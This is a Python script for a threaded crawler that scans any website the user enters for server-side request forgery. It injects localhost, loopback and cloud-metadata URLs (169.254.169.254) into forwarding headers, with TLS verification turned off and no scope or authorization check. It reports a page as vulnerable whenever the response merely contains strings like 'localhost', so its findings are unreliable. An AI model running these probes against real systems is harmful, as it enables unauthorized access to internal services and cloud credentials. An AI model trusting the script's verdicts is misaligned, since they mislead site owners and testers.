import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import threading
import time
from colorama import Fore, Style, init
import queue

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings (not recommended for production)
requests.packages.urllib3.disable_warnings()

# Global variables
visited_urls = set()
vulnerable_urls = set()
url_queue = queue.Queue()
lock = threading.Lock()
start_time = time.time()

ssrf_payloads = [
    "http://localhost",
    "http://127.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://internal.server"
]

headers_to_test = {
    "X-Forwarded-For": "FUZZ",
    "X-Client-IP": "FUZZ",
    "X-Real-IP": "FUZZ"
}


def is_valid_url(url):
    """
    Check if the URL is valid.
    """
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def extract_urls(url, html_content):
    """
    Extract all URLs from the HTML content of a page.
    """
    soup = BeautifulSoup(html_content, "html.parser")
    urls = set()

    for a_tag in soup.find_all("a", href=True):
        href = a_tag["href"]
        full_url = urljoin(url, href)
        if is_valid_url(full_url):
            urls.add(full_url)

    return urls


def test_ssrf(url):
    """
    Test a URL for SSRF vulnerabilities using various payloads.
    """
    vulnerable = False
    for payload in ssrf_payloads:
        for header_name, header_value in headers_to_test.items():
            headers = {header_name: header_value.replace("FUZZ", payload)}
            try:
                response = requests.get(url, headers=headers, verify=False, timeout=5)
                if any(marker in response.text for marker in ["localhost", "127.0.0.1", "169.254"]):
                    print(f"{Fore.GREEN}[!] SSRF Vulnerability Found: {url} with payload {payload}{Style.RESET_ALL}")
                    with lock:
                        vulnerable_urls.add((url, payload))
                        vulnerable = True
            except Exception as e:
                print(f"{Fore.RED}Error testing {url} with payload {payload}: {e}{Style.RESET_ALL}")
    return vulnerable


def crawl():
    """
    Worker function to crawl URLs from the queue.
    """
    while not url_queue.empty():
        url = url_queue.get()

        with lock:
            if url in visited_urls:
                url_queue.task_done()
                continue
            visited_urls.add(url)

        print(f"{Fore.CYAN}Crawling: {url}{Style.RESET_ALL}")

        try:
            response = requests.get(url, verify=False, timeout=5)
            if response.status_code == 200:
                # Test for SSRF vulnerability
                if test_ssrf(url):
                    print(f"{Fore.GREEN}[!] Vulnerability confirmed at: {url}{Style.RESET_ALL}")

                # Extract and add new URLs to the queue
                urls = extract_urls(url, response.text)
                for new_url in urls:
                    if new_url not in visited_urls:
                        url_queue.put(new_url)
        except Exception as e:
            print(f"{Fore.RED}Error crawling {url}: {e}{Style.RESET_ALL}")

        url_queue.task_done()


def main():
    target_url = input("Enter the target website URL: ")

    # Ensure the target URL ends with a slash
    if not target_url.endswith("/"):
        target_url += "/"

    print(f"{Fore.YELLOW}Starting SSRF scan on: {target_url}{Style.RESET_ALL}")
    url_queue.put(target_url)

    num_threads = 10  # Adjust the number of threads as needed

    # Create and start threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=crawl)
        thread.start()
        threads.append(thread)

    # Wait for all URLs to be processed
    url_queue.join()

    # Stop threads
    for thread in threads:
        thread.join()

    # Calculate total time taken
    end_time = time.time()
    total_time = end_time - start_time

    # Generate detailed report
    print(f"\n{Fore.YELLOW}Scan completed in {total_time:.2f} seconds!{Style.RESET_ALL}")
    if vulnerable_urls:
        print(f"\n{Fore.RED}Vulnerable URLs:{Style.RESET_ALL}")
        for vuln_url, payload in vulnerable_urls:
            print(f"{Fore.RED}- {vuln_url} with payload: {payload}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}No SSRF vulnerabilities found.{Style.RESET_ALL}")

    print(f"\n{Fore.CYAN}Detailed Report:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Total URLs Crawled: {len(visited_urls)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Total Vulnerable URLs Found: {len(vulnerable_urls)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Time Taken: {total_time:.2f} seconds{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
